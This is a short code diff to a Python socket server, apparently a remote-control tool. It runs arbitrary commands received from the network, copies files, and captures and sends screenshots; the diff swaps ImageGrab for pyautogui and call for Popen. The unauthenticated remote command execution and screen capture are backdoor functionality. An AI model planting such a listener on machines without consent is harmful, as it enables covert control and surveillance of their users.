@@ -6,7 +6,7 @@ import glob
 import json
 import shutil
 import subprocess
-from PIL import ImageGrab
+import pyautogui
 from protocol import Protocol
 HOST = '0.0.0.0'
 
@@ -106,10 +106,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                         shutil.copy(command[1].decode(), command[2].decode())
                         data_to_send = f"Succesfully copied {command[1].decode(), command[2].decode()}".encode()
                 elif command_type == Protocol.COMMAND_EXECUTE:
-                    subprocess.call(command[1].decode())
+                    subprocess.Popen(command[1].decode())
                     data_to_send = b"Executed successfully"
                 elif command_type == Protocol.COMMAND_TAKE_SCREENSHOT:
-                    image = ImageGrab.grab()
+                    image = pyautogui.screenshot()
                     file_name = "ss.jpg"
                     image.save(file_name)
                     Protocol.send_file(conn, file_name)
